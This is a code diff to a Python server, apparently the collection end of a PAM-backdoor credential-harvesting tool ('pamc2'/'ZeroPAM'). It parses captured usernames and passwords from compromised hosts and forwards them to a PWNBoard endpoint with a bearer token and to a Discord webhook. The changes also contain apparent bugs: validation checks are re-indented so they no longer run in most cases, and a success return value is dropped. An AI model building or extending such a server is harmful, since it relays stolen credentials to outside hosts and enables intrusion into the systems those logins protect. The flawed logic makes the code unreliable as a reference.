@@ -8,6 +8,8 @@ from dotenv import load_dotenv
 
 # Maximum concurrent client handlers to prevent file-descriptor exhaustion
 MAX_CONCURRENT_CLIENTS = int(os.getenv("MAX_CONNS", "200"))
+ACCESS_TOKEN = os.environ.get("PWNBOARD_ACCESS_TOKEN", "None")
+WEBHOOK_URL = os.environ.get('WEBHOOK_URL', None)
 
 def server_args(cmd_str):
     parser = argparse.ArgumentParser(description="Server meant for use with pamc2")
@@ -27,11 +29,16 @@ def send_pwnboard(addr, data, pwnhost):
     username = data.split("-")[1].split(":")[1].strip()
     password = data.split("-")[1].split(":")[2].strip()
 
-    pwn_data = {"ip": ip, "username": username, "password": password}
+    headers = {'Content-Type': 'application/json', 'Authorization': f'Bearer {ACCESS_TOKEN}'}
+
+    pwn_data = {"ip": ip, "application": "ZeroPAM", "username": username, "password": password}
 
     try:
-        response = requests.post(host, json=pwn_data, timeout=3)
-        return True
+        r = requests.post(host, json=pwn_data, headers=headers, timeout=3)
+        if (r.status_code == 200):
+            print("Posted data to PWNBoard!")
+        else:
+            print(f"Unsuccessful PWNBoard POST: Code: {r.status_code}, Response: {r.text}")
     except Exception as E:
         print(E)
         return False
@@ -85,7 +92,10 @@ def send_discord(addr, data):
 
     try:
         # Add a timeout so threads don't hang forever on outbound HTTP
-        requests.post(os.getenv('WEBHOOK_URL'), json=hook_data, timeout=5)
+        if (WEBHOOK_URL):
+            r = requests.post(WEBHOOK_URL, json=hook_data, timeout=5)
+            if (r.status_code != 200):
+                print(f"Unsuccessful Discord POST: Code: {r.status_code}, Response: {r.text}")
     except Exception as e:
         # Log and continue; do not let this leak sockets or threads
         print(f"Discord webhook error: {e}")
@@ -187,6 +197,10 @@ def handle_client(lock, c, addr, cmd_args, sem: threading.BoundedSemaphore):
             print(f"Raw Data: {raw_data}")
             return
 
+        if (not data.startswith("USER") and not data.startswith("SUDO")):
+            print("Invalid Request Received")
+            return
+
         if (not cmd_args.onlynew):
             # Printing can be interleaved; guard with lock for readability
             with lock:
@@ -271,13 +285,13 @@ def setup(cmd_args=None, stop_event=None):
     if(type(cmd_args) == str):
         cmd_args = server_args(cmd_args)
 
-    if (cmd_args.discord and not os.getenv("WEBHOOK_URL")):
-        print("FATAL ERROR: You must set a WEBHOOK_URL environment variable to use --discord! Please either create a .env file with the WEBHOOK_URL or set the environment variable globally to use this setting.")
-        return False
+        if (cmd_args.discord and not os.getenv("WEBHOOK_URL")):
+            print("FATAL ERROR: You must set a WEBHOOK_URL environment variable to use --discord! Please either create a .env file with the WEBHOOK_URL or set the environment variable globally to use this setting.")
+            return False
 
-    if (cmd_args.nodb and cmd_args.onlynew):
-        print("FATAL ERROR: You cannot run no-db and only-new mode at the same time! Database checking is required for checking if request is new!")
-        return False
+        if (cmd_args.nodb and cmd_args.onlynew):
+            print("FATAL ERROR: You cannot run no-db and only-new mode at the same time! Database checking is required for checking if request is new!")
+            return False
 
     start_server(cmd_args, stop_event)
 
